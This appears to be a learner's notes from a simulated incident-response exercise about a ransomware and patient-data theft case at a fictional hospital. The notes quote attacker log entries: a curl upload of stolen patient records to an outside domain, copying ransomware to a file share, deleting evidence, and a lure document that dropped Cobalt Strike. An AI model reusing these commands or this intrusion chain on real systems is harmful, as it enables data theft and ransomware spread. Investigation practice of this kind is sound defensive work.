Jojo's Hospital



**Got a ransom file in a user's computer:**

"timestamp": 2024-06-17T14:49:02.000Z,

"hostname": AMFB-MACHINE,

"username": andavis,

"sha256": 97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018,

"path": C:\\Users\\andavis\\Documents\\We\_Have\_Your\_Data\_Pay\_Up.txt,

"filename": We\_Have\_Your\_Data\_Pay\_Up.txt,

"process\_name": explorer.exe

&#x20;

**Victim and End user:**

"hire\_date": 2022-06-15T00:00:00.000Z,

"name": Anthony Davis,

"user\_agent": Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/6.0),

"ip\_addr": 10.10.0.1,

"email\_addr": anthony\_davis@jojoshospital.org,

"company\_domain": jojoshospital.org,

"username": andavis,

"role": Senior IT Administrator,

"hostname": AMFB-MACHINE



**Ransomer process:**

"timestamp": 2024-06-17T13:35:12.000Z,

"parent\_process\_name": cmd.exe,

"parent\_process\_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,

"process\_commandline": cmd.exe /c copy C:\\\\Users\\\\andavis\\\\Downloads\\\\lockbyte\_ransomer.exe \\\\jojos-hospital.org\\\\shared\\\\spread\_ransomware.exe,

"process\_name": cmd.exe,

"process\_hash": b29f5d70d4bf72d146b932550b23541b0797f597e24331d47052dad5212925ba,

"hostname": AMFB-MACHINE,

"username": andavis



**Tools used to steal patient data:**

"timestamp": 2024-06-17T14:23:25.000Z,

"parent\_process\_name": cmd.exe,

"parent\_process\_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,

"process\_commandline": C:\\Users\\andavis\\Downloads\\patient\_data\_exporter.exe /export C:\\Users\\andavis\\Documents\\patient\_data\_1.zip /source \\\\jojos-hospital-server\\important\_data\\patient\_records,

"process\_name": **patient\_data\_exporter.exe**,

"process\_hash": 0d663ea9485770015ce187c5796b5e171bcf4b14d48175e7189a3456ccd8cb16,

"hostname": AMFB-MACHINE,

"username": andavis



**Data stolen/uploaded:**

"timestamp": 2024-06-17T17:18:57.000Z,

"parent\_process\_name": cmd.exe,

"parent\_process\_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,

"process\_commandline": cmd.exe /c curl -T C:\\Users\\andavis\\Documents\\patient\_data\_1.zip https://secure-health-access.com/upload/patient\_data\_1.zip,

"process\_name": cmd.exe,

"process\_hash": 21f6b0962ea22e6eb0c1bb6143090e6929b801b54c584268148518c1864ec3c6,



**Command to clear track/traces:**

"timestamp": 2024-06-17T17:36:47.000Z,

"parent\_process\_name": cmd.exe,

"parent\_process\_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,

"process\_commandline": **cmd.exe /c del C:\\Users\\andavis\\Documents\\patient\_data\_\*.zip**,

"process\_name": cmd.exe,

"process\_hash": 3400577569147cdb0ae8edbc9c77dd921a46ca43e7f386adee895a432baa2644,

"hostname": AMFB-MACHINE,

"username": andavis



**exporter.exe:**

"timestamp": 2024-06-17T14:22:29.000Z,

"method": GET,

"src\_ip": 10.10.0.1,

"user\_agent": Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/6.0),

"url": https://secure-health-access.com/tools/patient\_data\_exporter.exe



**hacker's ip:**

203.0.113.1/203.0.113.2.....Domain: secure-health-access.com/emr-help.net



**bypass recon**:

"timestamp": 2024-05-20T11:46:59.000Z,

"method": GET,

"src\_ip": 203.0.113.2,

"user\_agent": Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3,

"url": https://jojoshospital.org/search=how+to+bypass+security+JoJo%27s+Hospital,

"status\_code": 200



**first patient record search:**

"timestamp": 2024-05-20T00:00:00.000Z,

"method": GET,

"src\_ip": 203.0.113.1,

"user\_agent": Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3,

"url": https://jojoshospital.org/search=JoJo%27s+Hospital+patient+records,

"status\_code": 200



**Successful login on andavis:**

"hostname": MAIL-SERVER01,

"src\_ip": 203.0.113.1,

"user\_agent": Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3,

"username": andavis,

"result": Successful Login,

"password\_hash": a9fbcdd6b449063a2ff822ea7d266402,

"description": A user attempted to log in to their email



fake ad website:

raisinkanes.com



**redirect site:**

&#x20;nothing-to-see-here.net



**another redirect:**

&#x20;totally-legit-domain.com



**redirect to docx:**

&#x20;Raisin\_Kane\_Promo\_Offer.docx



**redirect to pdf:**

Raisin\_Kane\_Free\_Meal\_Voucher.pdf



**first victim machine:**

RQJQ-MACHINE time of download:  2024-05-01T09:56:50Z



**malicious file dropped:**

cobaltstrike.exe



**execution of file:**

&#x20;"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE" "C:\\Users\\evbrowne\\Downloads\\Raisin\_Kane\_Promo\_Offer.docx





**hacker cobaltstrike ip connect:**

93.238.22.122



**Haxker Ip connect to host machine:** 

&#x20;2024-05-14T12:24:45Z



**hacker scanner tool:**

advanced-ip-scanner.exe



file exfiltrated/uploaded:

&#x20;network\_diagrams.pdf/credentials.txt/ important\_network\_info.zip



**domain uploaded to:**

nothing-to-see-here.net





























